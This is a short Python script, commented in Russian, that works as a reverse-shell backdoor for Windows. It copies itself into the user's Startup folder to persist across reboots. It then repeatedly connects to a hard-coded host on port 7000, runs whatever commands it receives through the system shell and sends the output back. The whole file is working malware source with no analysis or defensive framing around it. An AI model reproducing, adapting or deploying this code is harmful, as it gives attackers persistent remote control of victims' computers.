import socket
import os
import sys

# Автозагрузка
Thisfile = sys.argv[0] # Полный путь к файлу, включая название и расширение
Thisfile_name = os.path.basename(Thisfile) # Название файла без пути
user_path = os.path.expanduser('~') # Путь к папке пользователя

if not os.path.exists(f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{Thisfile_name}"):
        os.system(f'copy "{Thisfile}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')


def ExecuteCommand(command):
    output = os.popen(command).read()
    return output

#192.168.1.5
def main():
    host = "192.168.100.18"  # ip который будем использовать
    port = 7000  # порт
    while True:
        while True:
            try:
                s = socket.socket()  # создаем сокет
                s.connect((host, port))  # подключаемся
            except:
                break

            while True:
                try:
                    data = s.recv(1024).decode()  # получаем команду
                    output = ExecuteCommand(str(data))
                    if len(output) == 0:
                        s.send(" ".encode())  # в случае, если рзультат
                        # пустой, отправляем пробел
                    else:
                        s.send(output.encode())  # отправляем результат
                except:
                    break
    s.close()


if __name__ == '__main__':
    main()
